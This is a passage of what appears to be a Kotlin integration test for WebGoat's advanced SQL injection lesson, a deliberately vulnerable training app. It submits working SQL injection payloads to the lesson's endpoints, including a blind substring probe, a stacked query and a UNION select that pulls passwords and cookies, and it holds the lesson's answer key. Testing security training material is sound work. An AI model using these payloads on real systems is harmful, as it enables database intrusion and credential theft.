...
class SqlInjectionAdvancedIntegrationTest : IntegrationTest() {
    @Test
    fun runTests() {
        startLesson("SqlInjectionAdvanced")

        var params = mutableMapOf<String, Any>()
        params["username_reg"] = "tom' AND substring(password,1,1)='t"
        params["password_reg"] = "password"
        params["email_reg"] = "someone@microsoft.com"
        params["confirm_password"] = "password"
        checkAssignmentWithPUT(webGoatUrlConfig.url("SqlInjectionAdvanced/register"), params, false)

        params = mutableMapOf()
        params["username_login"] = "tom"
        params["password_login"] = "thisisasecretfortomonly"
        checkAssignment(webGoatUrlConfig.url("SqlInjectionAdvanced/login"), params, true)

        params = mutableMapOf()
        params["userid_6a"] = "'; SELECT * FROM user_system_data;--"
        checkAssignment(webGoatUrlConfig.url("SqlInjectionAdvanced/attack6a"), params, true)

        params = mutableMapOf()
        params["userid_6a"] =
            "Smith' union select userid,user_name, user_name,user_name,password,cookie,userid from user_system_data --"
        checkAssignment(webGoatUrlConfig.url("SqlInjectionAdvanced/attack6a"), params, true)

        params = mutableMapOf()
        params["userid_6b"] = "passW0rD"
        checkAssignment(webGoatUrlConfig.url("SqlInjectionAdvanced/attack6b"), params, true)

        params = mutableMapOf()
        params["question_0_solution"] = "Solution 4: A statement has got values instead of a prepared statement"
        params["question_1_solution"] = "Solution 3: ?"
